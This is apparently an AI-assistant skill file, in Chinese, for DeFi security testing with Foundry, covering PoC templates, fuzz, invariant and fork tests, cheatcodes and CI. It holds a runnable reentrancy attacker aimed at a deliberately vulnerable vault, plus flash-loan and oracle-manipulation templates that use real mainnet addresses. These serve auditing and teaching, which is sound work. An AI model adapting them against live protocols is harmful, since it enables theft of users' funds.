---
name: foundry-security-testing
description: |
  Foundry安全测试专家技能。使用Foundry进行DeFi安全测试和漏洞PoC编写。
  覆盖foundry.toml配置优化、fork测试、PoC编写模板、fuzz/invariant测试、
  cheatcode高级用法、Slither/Echidna集成、CI/CD工作流。
  触发词：「写PoC」「fuzz测试」「invariant测试」「fork测试」「安全审计」「漏洞复现」。
---

# Foundry 安全测试 · DeFi Security Testing 操作手册

> 安全测试不是"跑一遍测试通过就行"——而是要思考"如何让测试失败"。
> PoC 是安全研究员的语言，Foundry 是写 PoC 最快的工具。

---

## 使用规则

**此 Skill 激活后，以 Foundry 安全测试专家身份回应。**

### 核心原则
- PoC 代码必须可直接运行，不留伪代码
- fork 测试使用精确的 block number 确保可复现
- fuzz 测试要设计有意义的输入范围，不做无效随机
- invariant 测试覆盖协议的核心不变量

### 触发式工作流

| 用户指令 | 行动 |
|----------|------|
| 「写 PoC」 | → 基于攻击描述输出完整可运行的 Foundry PoC |
| 「fuzz 测试」 | → 设计 fuzz 测试用例 + 有意义的输入范围 |
| 「invariant 测试」 | → 定义不变量 + 编写 invariant test |
| 「fork 测试」 | → 配置 fork 环境 + 编写 fork test |
| 「安全审计」 | → 输出 pre-audit checklist + 测试覆盖方案 |
| 「漏洞复现」 | → 从攻击 tx 还原漏洞，编写复现 PoC |
| 「gas 优化检测」 | → 使用 gas snapshot 对比 + forge test --gas-report |

---

## 一、配置优化

### 1.1 foundry.toml 安全测试配置

```toml
[profile.default]
src = "src"
out = "out"
libs = ["lib"]
solc = "0.8.20"
optimizer = true
optimizer_runs = 200
via_ir = false

# 安全测试关键配置
fuzz.runs = 10000              # fuzz 运行次数（审计时建议 10000+）
fuzz.max_test_rejects = 100000 # 最大拒绝次数
fuzz.seed = "0x1234"           # 固定 seed 保证可复现

invariant.runs = 256           # invariant 测试轮数
invariant.depth = 128          # 每轮调用深度
invariant.fail_on_revert = false  # revert 不视为失败（除非是 assert）
invariant.shrink_run_limit = 5000 # 缩减运行限制

# Fork 测试配置
[rpc_endpoints]
mainnet = "${MAINNET_RPC_URL}"
arbitrum = "${ARBITRUM_RPC_URL}"
optimism = "${OPTIMISM_RPC_URL}"

# Etherscan 验证
[etherscan]
mainnet = { key = "${ETHERSCAN_API_KEY}" }

[profile.ci]
fuzz.runs = 50000              # CI 中跑更多轮
invariant.runs = 512
invariant.depth = 256
verbosity = 3
```

### 1.2 Fork 测试环境搭建

```bash
# 创建 .env 文件（不要提交到 git）
echo 'MAINNET_RPC_URL=https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY' > .env

# 确认 fork 可用
forge test --fork-url $MAINNET_RPC_URL --fork-block-number 18500000 -vvvv

# 使用 cache 加速（fork 数据会缓存到本地）
# 默认缓存目录: ~/.foundry/cache/rpc/
```

#### 环境变量管理

```solidity
// 在测试中使用环境变量
contract ForkTest is Test {
    function setUp() public {
        // 从 .env 读取 RPC URL
        string memory rpcUrl = vm.envString("MAINNET_RPC_URL");
        uint256 forkId = vm.createFork(rpcUrl, 18500000);
        vm.selectFork(forkId);
    }
}
```

---

## 二、PoC 编写

### 2.1 Fork 主网复现历史攻击

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract AttackReproduction is Test {
    // 主网地址常量
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant VICTIM_PROTOCOL = address(0); // 替换为实际地址

    address attacker = makeAddr("attacker");

    function setUp() public {
        // Fork 到攻击发生前的区块
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), 18499999);

        // 给攻击者初始资金
        vm.deal(attacker, 100 ether);
    }

    function testAttack() public {
        vm.startPrank(attacker);

        uint256 balanceBefore = attacker.balance;
        console.log("Balance before:", balanceBefore);

        // === 攻击步骤 ===
        // Step 1: 闪电贷借款
        // Step 2: 利用漏洞
        // Step 3: 偿还闪电贷
        // === 攻击结束 ===

        uint256 balanceAfter = attacker.balance;
        console.log("Balance after:", balanceAfter);
        console.log("Profit:", balanceAfter - balanceBefore);

        // 验证攻击成功
        assertGt(balanceAfter, balanceBefore, "Attack should be profitable");

        vm.stopPrank();
    }
}
```

### 2.2 闪电贷 PoC 模板

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// Aave V3 Flash Loan
interface IPool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IFlashLoanSimpleReceiver {
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

// Balancer Flash Loan（无手续费）
interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

contract FlashLoanPoCTemplate is Test, IFlashLoanRecipient {
    // Balancer Vault（无手续费闪电贷）
    IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), 18500000);
    }

    function testFlashLoanAttack() public {
        console.log("=== Flash Loan Attack PoC ===");
        console.log("WETH balance before:", WETH.balanceOf(address(this)));

        // 发起闪电贷
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 10000 ether; // 借 10000 WETH

        VAULT.flashLoan(address(this), tokens, amounts, "");

        console.log("WETH balance after:", WETH.balanceOf(address(this)));
        console.log("Attack completed successfully!");
    }

    // Balancer 回调
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory /* userData */
    ) external override {
        require(msg.sender == address(VAULT), "not vault");

        // ========== 攻击逻辑开始 ==========
        uint256 borrowedAmount = amounts[0];
        console.log("Borrowed WETH:", borrowedAmount);

        // Step 1: 存入协议
        // Step 2: 利用漏洞
        // Step 3: 提取利润

        // ========== 攻击逻辑结束 ==========

        // 偿还闪电贷（Balancer 无手续费）
        IERC20(tokens[0]).transfer(address(VAULT), amounts[0] + feeAmounts[0]);
    }
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}
```

### 2.3 重入攻击 PoC 模板

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// 模拟存在重入漏洞的合约
contract VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // 漏洞：先转账再更新余额（CEI violation）
    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "no balance");
        (bool success, ) = msg.sender.call{value: bal}("");
        require(success, "transfer failed");
        balances[msg.sender] = 0; // 状态更新在转账之后
    }

    receive() external payable {}
}

contract ReentrancyAttacker {
    VulnerableVault public vault;
    uint256 public attackCount;

    constructor(address _vault) {
        vault = VulnerableVault(payable(_vault));
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether && attackCount < 10) {
            attackCount++;
            vault.withdraw();
        }
    }
}

contract ReentrancyPoC is Test {
    VulnerableVault vault;
    ReentrancyAttacker attacker;

    function setUp() public {
        vault = new VulnerableVault();
        attacker = new ReentrancyAttacker(address(vault));

        // 模拟 vault 中有其他用户的存款
        address user1 = makeAddr("user1");
        vm.deal(user1, 10 ether);
        vm.prank(user1);
        vault.deposit{value: 10 ether}();
    }

    function testReentrancy() public {
        vm.deal(address(attacker), 1 ether);

        console.log("Vault balance before:", address(vault).balance);
        console.log("Attacker balance before:", address(attacker).balance);

        attacker.attack{value: 1 ether}();

        console.log("Vault balance after:", address(vault).balance);
        console.log("Attacker balance after:", address(attacker).balance);

        // 攻击者应该拿到了 vault 中所有 ETH
        assertEq(address(vault).balance, 0);
        assertGt(address(attacker).balance, 1 ether);
    }
}
```

### 2.4 预言机操纵 PoC 模板

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint256, uint256, address, bytes calldata) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory);
}

// 模拟使用 spot price 作为预言机的协议（有漏洞）
interface IVulnerableLending {
    function deposit(address token, uint256 amount) external;
    function borrow(address token, uint256 amount) external;
    function getPrice(address token) external view returns (uint256);
}

contract OracleManipulationPoC is Test {
    // 主网地址
    IUniswapV2Router02 constant router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), 18500000);
    }

    function testOracleManipulation() public {
        vm.startPrank(attacker);
        vm.deal(attacker, 1000 ether);

        // Step 1: 记录操纵前的价格
        // uint256 priceBefore = lending.getPrice(targetToken);
        // console.log("Price before manipulation:", priceBefore);

        // Step 2: 大额 swap 操纵价格
        // router.swapExactTokensForTokens(...)

        // Step 3: 利用被操纵的价格借贷
        // lending.borrow(...)

        // Step 4: 反向 swap 恢复价格
        // router.swapExactTokensForTokens(...)

        // Step 5: 验证获利
        // uint256 profit = IERC20(token).balanceOf(attacker);
        // console.log("Profit:", profit);

        vm.stopPrank();
    }
}
```

---

## 三、Fuzz 测试

### 3.1 Fuzz 配置最佳实践

```toml
# foundry.toml
[profile.default]
# 开发时快速反馈
fuzz.runs = 1000
fuzz.seed = "0xdeadbeef"  # 固定 seed 便于复现

[profile.audit]
# 审计时深度 fuzz
fuzz.runs = 100000
fuzz.max_test_rejects = 1000000
fuzz.dictionary_weight = 80  # 字典权重（使用合约中的常量）

[profile.ci]
# CI 中平衡速度和覆盖
fuzz.runs = 10000
```

### 3.2 有意义的 Fuzz 输入设计

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MeaningfulFuzzTest is Test {
    // 不好的做法：完全随机输入
    function testBad_randomFuzz(uint256 amount) public {
        // amount 可能是 0 或 type(uint256).max，大多数输入无意义
    }

    // 好的做法：约束输入范围
    function testGood_boundedFuzz(uint256 amount) public {
        // 限制在有意义的范围内
        amount = bound(amount, 1, 1e30); // 1 wei 到 10^30

        // 或使用 assume（但要注意拒绝率不要太高）
        vm.assume(amount > 0 && amount < type(uint128).max);
    }

    // 好的做法：多参数协调
    function testGood_coordinatedFuzz(
        uint256 depositAmount,
        uint256 withdrawAmount,
        uint256 timeDelta
    ) public {
        depositAmount = bound(depositAmount, 1e18, 1000e18);
        withdrawAmount = bound(withdrawAmount, 1, depositAmount); // withdraw <= deposit
        timeDelta = bound(timeDelta, 1, 365 days);

        // 现在参数之间有逻辑关系
    }

    // 好的做法：Fuzz 地址
    function testGood_addressFuzz(address user) public {
        vm.assume(user != address(0));
        vm.assume(user != address(this));
        vm.assume(user.code.length == 0); // 只测试 EOA
    }

    // 高级：自定义 fuzz 输入结构
    struct FuzzInput {
        uint8 action;      // 0=deposit, 1=withdraw, 2=transfer
        uint256 amount;
        address user;
    }

    function testAdvanced_structFuzz(FuzzInput memory input) public {
        input.amount = bound(input.amount, 1e16, 1000e18);
        input.action = uint8(bound(input.action, 0, 2));
        vm.assume(input.user != address(0));

        if (input.action == 0) {
            // deposit
        } else if (input.action == 1) {
            // withdraw
        } else {
            // transfer
        }
    }
}
```

### 3.3 Fuzz 发现漏洞的实际案例

```solidity
// 一个看似正确但有溢出风险的函数
contract TokenVault {
    mapping(address => uint256) public shares;
    uint256 public totalShares;
    uint256 public totalAssets;

    function deposit(uint256 assets) external returns (uint256 sharesMinted) {
        if (totalShares == 0) {
            sharesMinted = assets;
        } else {
            sharesMinted = (assets * totalShares) / totalAssets;
        }
        shares[msg.sender] += sharesMinted;
        totalShares += sharesMinted;
        totalAssets += assets;
    }

    function withdraw(uint256 sharesToBurn) external returns (uint256 assetsReturned) {
        assetsReturned = (sharesToBurn * totalAssets) / totalShares;
        shares[msg.sender] -= sharesToBurn;
        totalShares -= sharesToBurn;
        totalAssets -= assetsReturned;
    }
}

contract VaultFuzzTest is Test {
    TokenVault vault;

    function setUp() public {
        vault = new TokenVault();
    }

    // 这个 fuzz test 可以发现"首个存款者攻击"
    function testFuzz_firstDepositorAttack(
        uint256 attackerDeposit,
        uint256 donation,
        uint256 victimDeposit
    ) public {
        attackerDeposit = bound(attackerDeposit, 1, 100);   // 极小存款
        donation = bound(donation, 1e18, 1000e18);           // 大额捐赠
        victimDeposit = bound(victimDeposit, 1e18, 100e18);  // 正常存款

        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");

        // 攻击者最小存款
        vm.prank(attacker);
        vault.deposit(attackerDeposit);

        // 攻击者直接向合约"捐赠"资产（模拟）
        // 这会增加 totalAssets 但不增加 totalShares
        // vault.totalAssets += donation (通过直接转账)

        // 受害者存款 → 由于 rounding，可能得到 0 shares
        vm.prank(victim);
        uint256 victimShares = vault.deposit(victimDeposit);

        // 如果受害者得到 0 shares，说明存在漏洞
        assertGt(victimShares, 0, "Victim got 0 shares - first depositor attack!");
    }
}
```

---

## 四、Invariant 测试

### 4.1 定义与编写 Invariants

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/StdInvariant.sol";

contract ERC20Token {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// Handler: 定义 invariant 测试可以调用的操作
contract ERC20Handler is Test {
    ERC20Token public token;
    address[] public actors;
    uint256 public ghost_totalMinted;
    uint256 public ghost_totalTransferred;

    constructor(ERC20Token _token) {
        token = _token;
        actors.push(makeAddr("actor1"));
        actors.push(makeAddr("actor2"));
        actors.push(makeAddr("actor3"));
    }

    function mint(uint256 actorSeed, uint256 amount) external {
        amount = bound(amount, 1, 1e24);
        address actor = actors[actorSeed % actors.length];
        token.mint(actor, amount);
        ghost_totalMinted += amount;
    }

    function transfer(uint256 fromSeed, uint256 toSeed, uint256 amount) external {
        address from = actors[fromSeed % actors.length];
        address to = actors[toSeed % actors.length];
        amount = bound(amount, 0, token.balanceOf(from));
        if (amount == 0) return;

        vm.prank(from);
        token.transfer(to, amount);
        ghost_totalTransferred += amount;
    }
}

contract ERC20InvariantTest is StdInvariant, Test {
    ERC20Token token;
    ERC20Handler handler;

    function setUp() public {
        token = new ERC20Token();
        handler = new ERC20Handler(token);

        // 只允许 handler 被 invariant 测试调用
        targetContract(address(handler));
    }

    // 不变量1: totalSupply == sum of all balances
    function invariant_totalSupplyEqualsSumOfBalances() public view {
        uint256 sumBalances;
        address[] memory actors = new address[](3);
        actors[0] = makeAddr("actor1");
        actors[1] = makeAddr("actor2");
        actors[2] = makeAddr("actor3");

        for (uint256 i = 0; i < actors.length; i++) {
            sumBalances += token.balanceOf(actors[i]);
        }
        assertEq(token.totalSupply(), sumBalances);
    }

    // 不变量2: totalSupply == ghost_totalMinted
    function invariant_totalSupplyEqualsGhostMinted() public view {
        assertEq(token.totalSupply(), handler.ghost_totalMinted());
    }

    // 不变量3: 没有地址的余额超过 totalSupply
    function invariant_noBalanceExceedsTotalSupply() public view {
        address[] memory actors = new address[](3);
        actors[0] = makeAddr("actor1");
        actors[1] = makeAddr("actor2");
        actors[2] = makeAddr("actor3");

        for (uint256 i = 0; i < actors.length; i++) {
            assertLe(token.balanceOf(actors[i]), token.totalSupply());
        }
    }
}
```

### 4.2 DeFi Invariant 模板

```solidity
// 常见 DeFi 协议不变量

// === AMM / DEX 不变量 ===
// 1. x * y >= k (恒定乘积)
function invariant_constantProduct() public {
    (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
    assertGe(uint256(reserve0) * uint256(reserve1), lastK);
}

// 2. LP token totalSupply > 0 当且仅当 reserve > 0
function invariant_lpSupplyConsistency() public {
    uint256 lpSupply = pair.totalSupply();
    (uint112 r0, uint112 r1, ) = pair.getReserves();
    if (lpSupply > 0) {
        assertTrue(r0 > 0 && r1 > 0);
    }
}

// === Lending 不变量 ===
// 3. 总借款 <= 总存款
function invariant_borrowLtDeposit() public {
    assertLe(lending.totalBorrows(), lending.totalDeposits());
}

// 4. 用户借款 <= 用户抵押品价值 * LTV
function invariant_ltv() public {
    for (uint i = 0; i < users.length; i++) {
        uint256 borrowValue = lending.getBorrowValue(users[i]);
        uint256 collateralValue = lending.getCollateralValue(users[i]);
        uint256 maxLTV = lending.maxLTV();
        assertLe(borrowValue * 10000, collateralValue * maxLTV);
    }
}

// === Vault 不变量 ===
// 5. shares 总量对应的 assets 等于实际持有量
function invariant_vaultSolvency() public {
    uint256 totalAssetsByShares = vault.convertToAssets(vault.totalSupply());
    uint256 actualAssets = token.balanceOf(address(vault));
    assertLe(totalAssetsByShares, actualAssets);
}

// 6. deposit 后 withdraw 不应亏损（扣除手续费后）
function invariant_noLossOnRoundTrip() public {
    // 在 handler 中追踪 ghost 变量
    assertGe(
        handler.ghost_totalWithdrawn() + token.balanceOf(address(vault)),
        handler.ghost_totalDeposited()
    );
}
```

### 4.3 Actor-based Invariant Testing

```solidity
// 多角色 invariant 测试
contract LendingHandler is Test {
    LendingProtocol lending;
    IERC20 collateralToken;
    IERC20 borrowToken;

    address[] public depositors;
    address[] public borrowers;

    // Ghost 变量追踪
    uint256 public ghost_totalDeposited;
    uint256 public ghost_totalBorrowed;
    uint256 public ghost_totalRepaid;

    modifier useDepositor(uint256 seed) {
        address depositor = depositors[seed % depositors.length];
        vm.startPrank(depositor);
        _;
        vm.stopPrank();
    }

    modifier useBorrower(uint256 seed) {
        address borrower = borrowers[seed % borrowers.length];
        vm.startPrank(borrower);
        _;
        vm.stopPrank();
    }

    function deposit(uint256 actorSeed, uint256 amount) external useDepositor(actorSeed) {
        amount = bound(amount, 1e18, 100e18);
        deal(address(collateralToken), msg.sender, amount);
        collateralToken.approve(address(lending), amount);
        lending.deposit(amount);
        ghost_totalDeposited += amount;
    }

    function borrow(uint256 actorSeed, uint256 amount) external useBorrower(actorSeed) {
        uint256 maxBorrow = lending.maxBorrowable(msg.sender);
        amount = bound(amount, 0, maxBorrow);
        if (amount == 0) return;
        lending.borrow(amount);
        ghost_totalBorrowed += amount;
    }

    function repay(uint256 actorSeed, uint256 amount) external useBorrower(actorSeed) {
        uint256 debt = lending.debtOf(msg.sender);
        amount = bound(amount, 0, debt);
        if (amount == 0) return;
        deal(address(borrowToken), msg.sender, amount);
        borrowToken.approve(address(lending), amount);
        lending.repay(amount);
        ghost_totalRepaid += amount;
    }

    function warpTime(uint256 seconds_) external {
        seconds_ = bound(seconds_, 1, 30 days);
        vm.warp(block.timestamp + seconds_);
    }
}
```

---

## 五、高级 Cheatcodes

### 5.1 常用安全测试 Cheatcodes

```solidity
contract CheatcodeExamples is Test {

    // === 身份模拟 ===
    function example_prank() public {
        address admin = makeAddr("admin");
        vm.prank(admin);           // 下一次调用使用 admin 身份
        protocol.adminFunction();

        vm.startPrank(admin);      // 持续使用 admin 身份
        protocol.adminFunction1();
        protocol.adminFunction2();
        vm.stopPrank();
    }

    // === 余额操纵 ===
    function example_deal() public {
        address user = makeAddr("user");
        vm.deal(user, 100 ether);  // 设置 ETH 余额

        // ERC20 余额（直接修改 storage）
        deal(address(USDC), user, 1000000e6);
        // 或使用 stdstore
        stdstore
            .target(address(token))
            .sig("balanceOf(address)")
            .with_key(user)
            .checked_write(1000e18);
    }

    // === 时间操纵 ===
    function example_warp() public {
        vm.warp(block.timestamp + 7 days);    // 跳转到 7 天后
        vm.roll(block.number + 100);           // 跳转 100 个区块
        skip(1 hours);                         // 跳过 1 小时
        rewind(30 minutes);                    // 回退 30 分钟
    }

    // === 存储操纵 ===
    function example_store() public {
        // 直接写入 storage slot
        bytes32 slot = keccak256(abi.encode(user, uint256(0))); // mapping slot
        vm.store(address(contract_), slot, bytes32(uint256(999)));

        // 读取 storage
        bytes32 value = vm.load(address(contract_), slot);
    }

    // === 期望 revert ===
    function example_expectRevert() public {
        vm.expectRevert("Ownable: caller is not the owner");
        protocol.adminFunction();

        // 自定义 error
        vm.expectRevert(abi.encodeWithSelector(CustomError.selector, arg1, arg2));
        protocol.riskyFunction();
    }

    // === 期望 emit ===
    function example_expectEmit() public {
        vm.expectEmit(true, true, false, true);
        emit Transfer(from, to, amount);
        token.transfer(to, amount);
    }

    // === 快照与恢复 ===
    function example_snapshot() public {
        uint256 snapshotId = vm.snapshot();  // 保存状态
        // ... 执行一些操作 ...
        vm.revertTo(snapshotId);             // 恢复状态
    }

    // === 模拟外部调用返回值 ===
    function example_mock() public {
        vm.mockCall(
            address(oracle),
            abi.encodeWithSelector(oracle.getPrice.selector),
            abi.encode(uint256(2000e8))  // 模拟返回价格 2000
        );
    }

    // === Label 地址（调试时可读性） ===
    function example_label() public {
        vm.label(address(0x1234), "Attacker");
        vm.label(address(0x5678), "Victim Protocol");
    }
}
```

### 5.2 Gas Snapshot 对比

```bash
# 生成 gas snapshot
forge snapshot

# 对比两次 snapshot
forge snapshot --diff .gas-snapshot

# 在测试中使用 gas 检查
# forge test --gas-report
```

```solidity
contract GasTest is Test {
    function testGas_deposit() public {
        uint256 gasBefore = gasleft();
        vault.deposit(1e18);
        uint256 gasUsed = gasBefore - gasleft();
        console.log("Gas used for deposit:", gasUsed);
        assertLt(gasUsed, 200000, "Deposit too expensive");
    }
}
```

### 5.3 Slither / Echidna 集成

```bash
# Slither 静态分析（与 Foundry 项目集成）
slither . --config-file slither.config.json

# slither.config.json
# {
#   "filter_paths": ["lib/", "test/"],
#   "detectors_to_run": "all",
#   "exclude_informational": false,
#   "solc_remaps": ["@openzeppelin/=lib/openzeppelin-contracts/"]
# }

# Echidna fuzz 测试（读取 Foundry 编译产物）
echidna . --contract EchidnaTest --config echidna.yaml

# echidna.yaml
# testMode: assertion
# testLimit: 100000
# deployer: "0x10000"
# sender: ["0x20000", "0x30000"]
# corpusDir: "echidna-corpus"
# cryticArgs: ["--foundry-compile-all"]
```

---

## 六、安全审计工作流

### 6.1 Pre-Audit Checklist

```
□ 代码编译通过（forge build 无 warning）
□ 所有已知测试通过（forge test）
□ 测试覆盖率 > 90%（forge coverage）
□ Slither 无 High/Medium 发现（或已确认为 false positive）
□ 所有外部调用有 reentrancy guard
□ 所有数学运算使用 SafeMath 或 Solidity 0.8+
□ Access control 完整（关键函数有权限检查）
□ 预言机使用有 TWAP 或多源验证
□ 闪电贷防护（关键操作的 same-block 检查）
□ 前端参数验证（滑点保护、deadline 检查）
```

### 6.2 测试覆盖标准

```bash
# 生成覆盖率报告
forge coverage --report lcov

# 使用 genhtml 生成 HTML 报告
genhtml lcov.info -o coverage-report --branch-coverage

# 覆盖率标准（安全审计级别）
# - Line coverage: > 95%
# - Branch coverage: > 90%
# - Function coverage: 100%
```

### 6.3 CI/CD 集成

```yaml
# .github/workflows/security.yml
name: Security Tests

on:
  push:
    branches: [main]
  pull_request:

jobs:
  foundry-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          submodules: recursive

      - name: Install Foundry
        uses: foundry-rs/foundry-toolchain@v1

      - name: Build
        run: forge build --sizes

      - name: Unit Tests
        run: forge test -vvv

      - name: Fuzz Tests (Extended)
        run: forge test --match-test "testFuzz" -vvv
        env:
          FOUNDRY_PROFILE: ci

      - name: Invariant Tests
        run: forge test --match-test "invariant" -vvv
        env:
          FOUNDRY_PROFILE: ci

      - name: Coverage
        run: |
          forge coverage --report summary
          forge coverage --report lcov
          # 失败如果覆盖率低于 90%

      - name: Gas Snapshot
        run: forge snapshot --check .gas-snapshot

  slither:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          submodules: recursive

      - name: Slither Analysis
        uses: crytic/slither-action@v0.3.0
        with:
          fail-on: medium
```

---

## 七、常见 DeFi 漏洞 PoC 速查

| 漏洞类型 | 关键 Cheatcodes | 核心思路 |
|----------|----------------|----------|
| **重入** | `vm.prank`, `receive()` | 在回调中重复调用 |
| **闪电贷攻击** | `vm.createSelectFork` | Balancer/Aave 闪电贷 + 漏洞利用 |
| **预言机操纵** | `vm.mockCall` 或真实 swap | 大额交易扭曲价格 |
| **首个存款者攻击** | `deal`, `vm.prank` | 极小存款 + 捐赠导致精度损失 |
| **访问控制缺失** | `vm.prank(attacker)` | 用非授权地址调用 admin 函数 |
| **时间锁绕过** | `vm.warp` | 跳过等待期 |
| **滑点攻击** | fork + swap | Sandwich 模拟 |
| **治理攻击** | `deal` + `vm.roll` | 闪电贷获取投票权 + 提案执行 |

---

## 关联技能

- [samczsun-perspective](../samczsun-perspective/SKILL.md) — samczsun 的安全研究方法论
- [defi-audit-methodology](../defi-audit-methodology/SKILL.md) — DeFi 审计系统方法论
- [onchain-forensics](../onchain-forensics/SKILL.md) — 链上取证分析，攻击事后调查
